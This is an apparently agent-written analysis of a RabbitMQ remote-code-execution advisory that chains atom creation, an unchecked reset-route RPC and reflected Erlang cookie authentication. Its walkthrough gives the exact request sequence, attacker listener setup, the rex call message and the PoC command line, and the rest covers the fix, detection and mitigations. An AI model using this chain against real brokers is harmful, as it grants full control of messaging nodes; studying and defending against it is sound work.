# RabbitMQ Administrator RCE Deepdive — GHSA-3526-xvv4-q9mr (CVE pending)

> **Deepdive written by an automated research agent** — 2026-10-10
> Target: **RabbitMQ** (message broker / streaming broker, Erlang/BEAM)
> Primary identifier: **GHSA-3526-xvv4-q9mr** — *RabbitMQ administrator RCE through reflected Erlang distribution authentication*
> **CVE status:** *Pending* — no CVE ID had been assigned as of 2026-10-10 (GitHub advisory `cve_id = null`; no NVD record matched the RCE description). This report uses the GHSA identifier as the canonical handle.

## Summary

GHSA-3526-xvv4-q9mr is a **remote code execution** vulnerability in the RabbitMQ broker that lets a management user holding the **`administrator` tag** escalate from "broker administration" to **arbitrary BEAM (Erlang) function execution** *without knowing the Erlang distribution cookie* and *without any local operating-system access*. The bug is not a single flaw but a **three-part chain**: (1) global-parameter names are coerced into new Erlang **atoms** that can be node identities, (2) the `DELETE /api/reset/:node` management route performs an **outbound RPC before validating cluster membership**, and (3) **Erlang/OTP 27's legacy distribution cookie digest is reflectable** between two connections because it is bound to the cookie and challenge but **not** to peer identity, connection direction, or the full handshake transcript. Once a distribution connection is authenticated via the reflected digest, the attacker sends a registered message to the standard **`rex`** remote-execution process and chooses the **module, function, and argument list** — i.e. arbitrary MFA (module-function-argument) execution in the broker's VM.

The flaw was **published 2026-08-18** by maintainer `michaelklishin` as part of a **ten-advisory coordinated wave** (RabbitMQ 4.3.5, released 2026-08-17) and is **fixed in 3.13.19, 4.0.24, 4.1.15, 4.2.10, and 4.3.5**. The reset-route fix is a single membership guard (`rabbit_nodes:is_member(Node) andalso rabbit:is_running(Node)`), landed in **PR #17106, merged 2026-08-05**. A **companion advisory, GHSA-27gv-h5q6-cpwg**, is the same mechanism reached through the *federation-management* route with only the lower **`policymaker`** tag (Low severity). A single-file, stdlib-only Python PoC shipped with the advisory was **verified end-to-end** against upstream `main` (commit `005db707`, Erlang/OTP 27) and against stock **RabbitMQ 4.3.4 on OTP 27** in Docker, printing `VULNERABLE`.

This is the **only RCE in RabbitMQ's 2026-08-18 wave** and is the most critical recent RabbitMQ RCE: it is a *broker-side* code-execution primitive (not a browser-side XSS), and it bypasses the Erlang cookie — the control that historically protected the distribution port.

## Vulnerability details

| Field | Value |
|---|---|
| **Advisory** | **GHSA-3526-xvv4-q9mr** (GitHub / rabbitmq-server) |
| **CVE** | **Pending** (not assigned as of 2026-10-10) |
| **Title** | RabbitMQ administrator RCE through reflected Erlang distribution authentication |
| **Severity (GitHub)** | **Medium** |
| **CVSS v4.0 (assigned)** | **5.9** — `CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N` *(single source: cybersecurity-help.cz SB2026081823 item #4; the GitHub advisory itself publishes no CVSS vector)* |
| **CWE (assigned)** | **CWE-284** — Improper Access Control *(single source: cybersecurity-help.cz SB2026081823)*; underlying mechanism also maps to **CWE-290** (Authentication Bypass by Assumed-Immutable / reflected data) — author mapping |
| **Vulnerability type** | Improper access control + reflected authentication → arbitrary **BEAM MFA execution (RCE)** |
| **Privileges required** | **High** — management user with the **`administrator`** tag (companion: `policymaker` via federation) |
| **Attack complexity** | **High** — requires two concurrent handshakes, attacker-controlled EPMD + two distribution ports, and the same cookie on both |
| **Affected versions** | `>= 3.13.0, < 3.13.19`; `>= 4.0.0, < 4.0.24`; `>= 4.1.0, < 4.1.15`; `>= 4.2.0, < 4.2.10`; `>= 4.3.0, < 4.3.5` |
| **Fixed versions** | **3.13.19 · 4.0.24 · 4.1.15 · 4.2.10 · 4.3.5** |
| **Fix (reset route)** | **PR #17106** — "HTTP API: validate the target node is a cluster member", merged **2026-08-05**, merge commit `84fc5f46119a1fbe876fcd7919dc036663f45671` |
| **Released** | 4.3.5 released **2026-08-17**; advisories published **2026-08-18**; Broadcom advisory **TNZ-2026-0382** (2026-09-04) lists 4.0.24 as the fix vehicle |
| **In the wild** | **No documented active exploitation** as of 2026-10-10 (advisory does not claim ITW; no KEV entry or named actor in public sources) |
| **PoC** | `rabbitmq-administrator-distribution-reflection-rce-poc.py` — single-file, Python 3 stdlib only, shipped as an advisory attachment |

**Scoring interpretation.** The assigned CVSS v4 (5.9, Medium) reflects the *prerequisites* rather than the *ceiling impact*: **PR:H** (high privileges = admin), **AC:L** but with a real **AT:P** (attacker must be positioned to intercept/reflect between two live handshakes — in practice the attacker runs its own EPMD + two distribution listeners), and a **VC:H / VI:L** impact split. The Medium label under-sells the outcome: a successful exploit yields **arbitrary BEAM function execution in the broker VM**, which is effectively full control of the messaging node. The lower CVSS is why this RCE is easy to overlook in patch triage even though it is the wave's only RCE.

## The 2026-08-18 advisory wave (context)

GHSA-3526-xvv4-q9mr was published on **2026-08-18** alongside **nine other advisories**, all resolved by the same 4.3.5 / 4.0.24 / 4.1.15 / 4.2.10 / 3.13.19 release set. Broadcom's product advisory **TNZ-2026-0382** (2026-09-04) enumerates the full ten:

| Advisory | Severity | Summary |
|---|---|---|
| **GHSA-3526-xvv4-q9mr** | Medium (CVE pending) | **Administrator RCE through reflected Erlang distribution authentication** *(this report)* |
| GHSA-27gv-h5q6-cpwg | Low (CVE pending) | **Policymaker RCE** through federation-management nonmember RPC + distribution reflection *(companion, same mechanism)* |
| CVE-2026-67421 | Medium | Stored HTML injection in RabbitMQ Management OAuth error handling |
| CVE-2026-67416 | Medium | AMQP 1.0 symbolic body descriptor prefix collisions bypass validation |
| CVE-2026-67414 | Medium | AMQP 1.0 parser amplification memory-exhaustion DoS (zero-width array aggregation) |
| CVE-2026-67412 | Medium | Federation upstream skips vhost authorization (cross-vhost message access) |
| CVE-2026-67418 | Low | MQTT 5.0 inapplicable PUBLISH property disconnects matching subscribers |
| CVE-2026-67420 | Low | OAuth credential refresh retains revoked runtime tags |
| GHSA-6gmw-wxch-cvvc | Medium (CVE pending) | Shovel URI credentials disclosed to read-only monitoring users |
| GHSA-6xpg-rfmh-grhq | Medium (CVE pending) | STOMP pre-authentication frame size limit not enforced (DoS) |

*(Source: Broadcom support advisory 38351 / 38353 / 38354 and the GitHub advisories.)* Within this wave, **two are RCEs** — the **admin** one covered here and the **policymaker** companion; the rest are DoS, auth/authorization bypasses, or an HTML injection.

## Affected and fixed versions

| Release series | Affected | Fixed |
|---|---|---|
| 3.13.x | `>= 3.13.0, < 3.13.19` | **3.13.19** |
| 4.0.x | `>= 4.0.0, < 4.0.24` | **4.0.24** |
| 4.1.x | `>= 4.1.0, < 4.1.15` | **4.1.15** |
| 4.2.x | `>= 4.2.0, < 4.2.10` | **4.2.10** |
| 4.3.x | `>= 4.3.0, < 4.3.5` | **4.3.5** |

**Release timing.** The 4.3.x fix shipped as the **4.3.5 maintenance release on 2026-08-17** (GitHub release, `published_at 2026-08-17T21:41:39Z`); the advisories were published the next day, **2026-08-18**. The underlying reset-route code fix (PR #17106) **merged 2026-08-05**. Broadcom separately tracks the 4.0.x line fix (4.0.24) under advisory **TNZ-2026-0382**, dated **2026-09-04**. (GitHub release tags for the backports v3.13.19 / v4.0.24 / v4.1.15 / v4.2.10 were not all individually resolvable via the release API at write time; the authoritative version ranges are from the advisory metadata.)

## Root cause

The exploit chain combines **three independently-present behaviors** in the management plugin and the Erlang/OTP distribution layer:

### 1. Global-parameter names become Erlang node atoms

The management global-parameter route passes its **raw URL path name** into `rabbit_runtime_parameters:set_global/3`, which coerces it to an atom:

```erlang
%% deps/rabbit/src/rabbit_runtime_parameters.erl  (cited lines ~95-112)
set_global(Name, Term, ActingUser) ->
    NameAsAtom = rabbit_data_coercion:to_atom(Name),
    ...
```

`rabbit_data_coercion:to_atom/1` ultimately calls **`binary_to_atom/2`**, so requests for:

```text
PUT /api/global-parameters/evil@attacker
PUT /api/global-parameters/oracle@attacker
```

**create new Erlang atoms** (`'evil@attacker'`, `'oracle@attacker'`) whose shape — `Name@Host` — is exactly the shape of an **Erlang node identity**. This is the atom-creation primitive. Relevant source cited by the advisory: `deps/rabbitmq_management/src/rabbit_mgmt_wm_global_parameter.erl:48-76` and `deps/rabbit/src/rabbit_runtime_parameters.erl:95-112`.

### 2. The reset route performs RPC *before* membership validation

The reset resource (`DELETE /api/reset/:node`) converts the route value with **`binary_to_existing_atom/2`** (it only succeeds for the *already-interned* atoms from step 1), then calls **`rabbit:is_running(Node)`** during `resource_exists/2`. For a **non-local** node, `rabbit:is_running/1` executes:

```erlang
rpc:call(Node, rabbit, is_running, [])
```

**No cluster-membership check occurs before this network operation.** So a single reset request to a nonmember atom forces the broker to resolve the node via **EPMD (TCP 4369)** and open an **outbound Erlang distribution handshake** to the attacker's node. **Two concurrent** reset requests produce **two** such handshakes — the setup the reflector needs. Crucially, **the final HTTP response can be 404** (the node is not a real member), yet the outbound EPMD lookup and distribution connection **have already occurred**. Relevant source: `deps/rabbitmq_management/src/rabbit_mgmt_wm_reset.erl:24-56` and `deps/rabbit/src/rabbit.erl:862-875`.

### 3. OTP 27's legacy cookie digest is reflectable

The Erlang distribution protocol authenticates a connection with a **cookie digest**:

```text
H(K, N) = MD5(K || decimal(N))
```

where `K` is the shared cookie and `N` is a per-handshake **challenge**. The advisory's core insight: this digest is bound to the **cookie** and the **challenge**, but **not** to the **peer identity**, the **connection direction**, or the **complete transcript**. That makes it **reflectable**:

1. Attacker node `evil` ("held") supplies challenge `Ns` to the broker.
2. The broker returns its own challenge `Nt` **and** `H(K, Ns)` on the `evil` connection.
3. The attacker **holds** the `evil` connection.
4. Attacker node `oracle` presents `Nt` as **its** challenge.
5. The broker returns `H(K, Nt)` on the `oracle` connection.
6. The attacker **copies that digest** into the held `evil` connection's acknowledgement.
7. The broker **authenticates the `evil` connection** — the attacker never learns `K`.

**Two distinct peer names** (`evil` and `oracle`) prevent OTP's normal simultaneous-connection arbitration from collapsing the two handshakes into one. This is what turns a *read-only* digest into a *usable* authenticated session.

### 4. An authenticated distribution peer can invoke `rex`

Once the held connection is authenticated, the attacker sends a **standard registered-send distribution message to `rex`** (the built-in remote-execution process) containing:

```erlang
{'$gen_call', {AttackerPid, Tag},
 {call, Module, Function, Arguments, AttackerPid}}
```

The attacker controls **`Module`, `Function`, `Arguments`, the external PID, and the correlation tag** — i.e. **arbitrary BEAM MFA execution** in the RabbitMQ VM. The advisory's own proof is deliberately non-destructive: it only invokes `erlang:md5/1` and verifies the returned digest.

## The fix (verified diff)

The reset-route fix, **PR #17106** ("HTTP API: validate the target node is a cluster member", merged **2026-08-05**, merge commit `84fc5f46119a1fbe876fcd7919dc036663f45671`), adds a **membership guard before the liveness RPC** in `rabbit_mgmt_wm_reset.erl`:

```diff
 resource_exists(ReqData, Context) ->
     try get_node(ReqData) of
         none       -> {true, ReqData, Context};
-        {ok, Node} -> {rabbit:is_running(Node),
-                       ReqData, Context}
+        {ok, Node} ->
+            %% We intentionally ignore nodes that are not cluster members before
+            %% invoking `rabbit:is_running/1'. MK.
+            {rabbit_nodes:is_member(Node) andalso rabbit:is_running(Node),
+             ReqData, Context}
     catch
         error:badarg -> {false, ReqData, Context}
     end.
```

Because the outbound `rpc:call` (and thus the EPMD lookup + distribution handshake) now only fires for **existing cluster members**, a pre-interned nonmember atom supplied to `/api/reset/:node` no longer triggers the network operation — closing the **admin** entry point.

**Companion / residual path.** The **policymaker** advisory (GHSA-27gv-h5q6-cpwg) documents that the **same reflection** was still reachable through the **federation-management** route — `DELETE /api/federation-links/vhost/:vhost/:id/:node/restart` — whose `resource_exists/2` calls `rpc:call(Node, rabbit_federation_status, lookup, [Id], infinity)` **without** a membership check. The advisory's isolated proof reproduced arbitrary BEAM MFA *on the exact PR #17106 merge commit* through that federation extension with the lower `policymaker` role, and a separate patch adds the same membership validation there. Both entry points are closed by the 3.13.19 / 4.0.24 / 4.1.15 / 4.2.10 / 4.3.5 releases.

## Exploitation walkthrough

The advisory ships a **single-file, stdlib-only Python 3** PoC (`rabbitmq-administrator-distribution-reflection-rce-poc.py`). It is an honest, reproducible exploit: it never calls `os:cmd`, reads a file, loads code, or spawns a shell — it only proves the arbitrary-MFA primitive. The mechanics, reconstructed from the shipped source:

**Attacker infrastructure.** The script launches three listeners on the attacker host:

1. **A minimal EPMD responder on TCP 4369** that answers name-lookup requests (`z` packets) for `evil` → port **19101** and `oracle` → port **19102**, each answered with the full node name `evil@attacker` / `oracle@attacker` and the advertised distribution port.
2. **A "held" distribution listener on 19101** impersonating node `evil@attacker`.
3. **An "oracle" distribution listener on 19102** impersonating node `oracle@attacker`.

**The four management requests (all Basic-auth, `administrator`):**

```text
PUT    /api/global-parameters/evil@attacker      -> 201   (interns the atom)
PUT    /api/global-parameters/oracle@attacker    -> 201   (interns the atom)
DELETE /api/reset/evil@attacker                  -> 404   (concurrent, triggers handshake 1)
DELETE /api/reset/oracle@attacker                -> 404   (concurrent, triggers handshake 2)
```

The two `DELETE` calls are fired **concurrently** (a 2-thread executor) so the broker holds **two live outbound handshakes** at once. The 404 responses are *expected* — the vulnerable outbound connections occur **during resource lookup, before the response is sent**.

**The reflection.** The `evil` handler records the broker's challenge `Nt`; the `oracle` handler presents `Nt` as its own challenge; when the broker returns `H(K, Nt)` on the `oracle` connection, the attacker threads that digest back to the `evil` connection as its acknowledgement. The broker then **authenticates `evil`** — `authenticated_without_cookie: true`.

**The RCE proof.** Over the authenticated connection the PoC sends a registered message to `rex`:

- **Negative control** — `erlang:md6/1` (a nonexistent function): the broker returns a correlated `badrpc / undef` reply **without** the positive digest, proving the MFA is attacker-chosen.
- **Positive control** — `erlang:md5/1` over the fixed nonce `b"RABBITMQ_REFLECTION_RPC_NONCE"` (hex `5241424249544d515f5245464c454354494f4e5f5250435f4e4f4e4345`): the broker returns the **exact digest** `45b3d29a7c795310de18a3903393bcc1` as a correlated reply — arbitrary MFA confirmed.

**Prerequisites / constraints.** A valid **`administrator`** management account; the management plugin + reset/global-parameter routes reachable; the broker **DNS-resolves** the attacker hostname used in the node names; broker **egress** reaches the attacker's **TCP 4369** and two distribution ports; **plain OTP 27 distribution** (or a transport accepting the attacker endpoints); and **both** outbound handshakes use **the same RabbitMQ cookie**. The attacker does **not** need the cookie value, local shell/filesystem, existing cluster membership, plugin/code-path write access, or the data directory. Binding port 4369 normally needs root or `CAP_NET_BIND_SERVICE`.

```bash
sudo python3 rabbitmq-administrator-distribution-reflection-rce-poc.py \
  --management-host rabbitmq.example \
  --management-port 15672 \
  --user administrator \
  --password <admin-password> \
  --attacker-hostname attacker
# (add --management-prefix <prefix> if the management API is under a path prefix)
```

### Verified reproduction

The advisory reports the PoC was **independently verified** two ways:

- **Current upstream `main`** — an isolated Docker verifier cloned, built, and ran the exact commit **`005db70727583ba59f9b99da16b7ec3a8285ac9f`** on **Erlang/OTP 27 (erts-15.2.7.10)**, producing:
  ```text
  DISTRIBUTION_REFLECTION_TRIGGER_OK
  DISTRIBUTION_REFLECTION_RCE_RESULT_OK
  LATEST_MAIN_DISTRIBUTION_REFLECTION_RCE_VERIFIED 005db70727583ba59f9b99da16b7ec3a8285ac9f
  Ping succeeded
  ```
- **Released Docker image** — run against **stock RabbitMQ 4.3.4 on Erlang/OTP 27** in two isolated Docker containers, producing:
  ```json
  {
    "global_parameter_statuses": [201, 201],
    "reset_statuses": [404, 404],
    "epmd_queries": ["evil", "oracle"],
    "authenticated_without_cookie": true,
    "reflection_digest_matches_oracle": true,
    "negative_control": { "function": "md6", "positive_digest_returned": false, "correlated_reply": true, "undef_returned": true },
    "positive_control": {
      "function": "md5",
      "nonce": "5241424249544d515f5245464c454354494f4e5f5250435f4e4f4e4345",
      "digest": "45b3d29a7c795310de18a3903393bcc1",
      "correlated_reply": true
    },
    "errors": []
  }
  VULNERABLE
  ```
  The source checkout remained unmodified and the broker remained healthy after the run.

## Impact

The demonstrated primitive is **arbitrary BEAM MFA execution in the RabbitMQ VM**. Depending on the modules loaded in the runtime, this lets an attacker:

- **Read or modify** files accessible to the RabbitMQ operating-system account;
- **Access broker credentials** and in-memory state (queues, exchanges, bindings, ACLs);
- **Open network connections** with the broker's privileges (lateral movement, callback to the attacker);
- **Invoke OS-command facilities** exposed by loaded Erlang modules;
- **Stop or corrupt** the RabbitMQ node (availability).

Because it executes inside the broker as the broker's own Erlang process, the practical blast radius is **full compromise of the messaging node**, which typically sits on a trusted internal network and can reach many downstream consumers and databases.

## In-the-wild status and MITRE mapping

**Status as of 2026-10-10:** the advisory **does not claim** active in-the-wild exploitation, and no CISA KEV entry or named threat actor was found in public sources for GHSA-3526-xvv4-q9mr. Treat it as **publicly disclosed, patch-available, not yet confirmed exploited** — but note the attack is *stealthy by design* (404 responses, no cookie leak, optional non-destructive MFA) and the prerequisites (an admin tag + a reachable management API + outbound EPMD/distribution egress) are common in cloud/VPC deployments.

**Exposure context.** The Erlang Ecosystem Foundation (Dec 2024) reported **85,000+ publicly reachable EPMD instances, ~40,000 associated with RabbitMQ** across China, the US, Germany, and major clouds — a standing attack surface for anything that turns a distribution port into code execution. *(single source: erlef.org security blog.)* This bug is notable because it achieves that same "join the cluster / run RPC" outcome **without** the cookie that EPMD-exposure writeups (e.g. Metasploit's `erlang_cookie_rce`) have historically required.

**MITRE ATT&CK mapping** *(author mapping — the advisory publishes no ATT&CK IDs):*

| Tactic / Technique | ID | Relevance |
|---|---|---|
| Initial Access / Execution | **T1190** Exploit Public-Facing Application | Abuses the management HTTP API (`/api/global-parameters`, `/api/reset`) |
| Execution | **T1059** Command and Scripting Interpreter | Arbitrary BEAM MFA (`rex`) — broker-side interpreter execution |
| Lateral Movement / C2 | **T1021** Remote Services | Erlang distribution + `rpc:call` over attacker-controlled EPMD/distribution ports |
| Discovery | **T1046** Network Service Discovery | Outbound **EPMD (4369)** name lookups for `evil` / `oracle` |
| Persistence / Valid Access | **T1078** Valid Accounts | Leverages a valid **`administrator`** management account |
| Defense Evasion | **T1029 / T1105** (fileless / staged MFA) | No file written, no shell spawned — purely in-process RPC |

## Detection

Indicators from the advisory (all grounded in the observed PoC traffic):

- **Administrator-authenticated** `PUT /api/global-parameters/:name` where the name **contains `@`** (node-shaped) — the atom-interning step.
- **Two closely timed** `DELETE /api/reset/:node` requests for **nonmember node names**.
- Reset responses returning **404 while outbound EPMD lookups occur** (correlate management 404s with new outbound connections).
- **Broker egress to unapproved TCP 4369** (EPMD) endpoints.
- **Distribution connections to nodes absent from cluster membership.**
- (Federation companion) `DELETE /api/federation-links/vhost/:vhost/:id/:node/restart` to a nonmember node followed by outbound distribution handshakes.

Practical correlation: pair the management-API audit log (admin + `@`-containing global parameters, reset 404s) with netflow/outbound firewall logs (new egress to `4369` and to the two returned distribution ports) and with Erlang's own connection log. A single admin creating `evil@x` / `oracle@x` global parameters is almost never benign.

## Mitigations

**Workarounds (any one, per the advisory):**

- Block traffic to the rarely used **`DELETE /api/reset/{node}`** HTTP API endpoint.
- Restrict **port 4369 (epmd)** and **25672** (default inter-node distribution port) access to only the hosts running RabbitMQ cluster members.
- Disable the **`rabbitmq_management`** plugin and use **Prometheus/Grafana + CLI** tools for monitoring instead.

**Temporary mitigations:**

- Restrict **EPMD** and **distribution egress** to an explicit list of cluster peers (egress firewall / security groups).
- Use **mutually-authenticated TLS distribution** with strict peer verification (tightens what an attacker endpoint can present).
- Restrict **`administrator`** credentials and monitor their use (least privilege; prefer `policymaker`/`management` where possible).
- Block or proxy-filter **reset** requests for nonmember node names.
- Alert on **node-shaped global-parameter names** (names containing `@`).

**Recommended remediation (advisory):**

- **Reset route:** resolve the supplied node **only from current cluster membership** before any liveness check or RPC; do not perform network operations from `resource_exists/2` using a route-derived atom; reuse the cluster-member validation already used by other management routes.
- **Global parameters:** store unrestricted names as **binaries**; do not create Erlang atoms from management path values; if atoms are unavoidable, use a finite **existing-atom allowlist** that cannot create arbitrary node identities.
- **Distribution:** coordinate with Erlang/OTP maintainers to **bind challenge authentication to peer identity, connection direction, and the complete transcript**; continue enforcing RabbitMQ-side membership checks even if OTP authentication is strengthened.
- **Regression tests:** a pre-interned nonmember to `/api/reset/:node` causes **no EPMD query**; current members retain expected reset behavior; global-parameter names **cannot create node-usable atoms**; two nonmember reset requests **cannot initiate concurrent outbound handshakes**.

## Companion vulnerability — GHSA-27gv-h5q6-cpwg (policymaker RCE)

The same three-part mechanism is reachable one privilege level lower, through the **federation-management** plugin, by a user with the **`policymaker`** tag (no `administrator` required):

- **Entry:** `DELETE /api/federation-links/vhost/:vhost/:id/:node/restart` — its `resource_exists/2` calls `rpc:call(Node, rabbit_federation_status, lookup, [Id], infinity)` **without** a cluster-membership check, so it too forces outbound EPMD + distribution handshakes to attacker nodes (responses may be 404).
- **Atom creation:** same `PUT /api/global-parameters/evil@attacker` / `oracle@attacker` (policymaker is authorized for global parameters).
- **Reflection + `rex`:** identical — OTP 27 reflectable digest, then arbitrary MFA to `rex`.
- **Severity (GitHub):** **Low**; **CVSS v4.0 2.3** `AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N` *(single source: cybersecurity-help.cz SB2026081823 item #3)*.
- **Prerequisites:** policymaker + permission for the selected vhost + `rabbitmq_federation` **and** `rabbitmq_federation_management` enabled + broker DNS/egress to attacker EPMD and distribution ports + plain OTP 27.
- **Relationship to #17106:** PR #17106 fixed the *admin reset* entry; the advisory's proof shows the *federation* entry survived the #17106 commit and needed its own membership-validation patch. **Fixed in the same set:** 3.13.19, 4.0.24, 4.1.15, 4.2.10, 4.3.5.

Practically: if you run federation + federation-management, treat this as a **second RCE vector** with weaker credentials.

## Related (not this RCE) — for disambiguation

- **CVE-2025-30219** (RabbitMQ 4.0.3 / Tanzu 4.0.3, 3.13.8): a *different* bug — a crafted vhost name that fails to start yields an **unescaped XSS / arbitrary JavaScript execution in the browser** of management-UI users (CVSS 3.1 **6.1**, scope changed, requires admin + on-disk vhost modification). It is a *browser-side* RCE, not the broker-side BEAM MFA execution covered here.
- **2026-09-25 RabbitMQ atom-exhaustion wave** (e.g. CVE-2026-67226/67227, CVE-2026-66071/66073): DoS via atom-table exhaustion on the *same* `to_atom` coercion path, but impact is **node crash**, not code execution.
- **CVE-2026-66069** / **CVE-2026-67224** (reset/auth-attempt endpoints): authorization-consistency issues around the same reset route family, not the distribution-reflection RCE.

## References (fetched sources)

1. GitHub advisory (primary, full PoC embedded): https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-3526-xvv4-q9mr
2. GitHub advisory API (metadata, `cve_id=null`, published 2026-08-18): https://api.github.com/repos/rabbitmq/rabbitmq-server/security-advisories/GHSA-3526-xvv4-q9mr
3. Companion policymaker advisory: https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-27gv-h5q6-cpwg
4. Fix PR #17106 (diff fetched): https://github.com/rabbitmq/rabbitmq-server/pull/17106
5. RabbitMQ 4.3.5 release notes: https://github.com/rabbitmq/rabbitmq-server/releases/tag/v4.3.5
6. Broadcom product advisory TNZ-2026-0382 (4.0.24, 2026-09-04, 10 vulns): https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38351
7. Broadcom companion advisories: https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38353 and /38354
8. cybersecurity-help.cz bulletin SB2026081823 (CVSS v4 + CWE-284 assignments, single source): https://cybersecurity-help.cz/vdb/SB2026081823
9. EEF EPMD exposure context (85k+/40k stats, single source): https://erlef.org/blog/security/epmd-public-exposure
10. EEF hardening guide for Erlang distribution: https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/distribution
11. RabbitMQ networking / EPMD docs: https://www.rabbitmq.com/docs/networking
12. Oday Bakkour, "Daily Dev Stack Security Audit" 2026-08-23 (wave framing): https://oday-bakkour.com/blog/daily-dev-stack-security-audit-2026-08-23
13. Disambiguation — CVE-2025-30219 (browser XSS RCE): https://nvd.nist.gov/vuln/detail/CVE-2025-30219

*All version ranges, dates, the fix diff, the PoC behavior, and the CVSS/CWE assignments above are grounded in the fetched sources. Items marked "(single source)" rely on one fetched reference. The GHSA has no CVSS vector or CWE of its own; the 5.9 / 2.3 vectors and CWE-284 come solely from the cybersecurity-help.cz bulletin.*
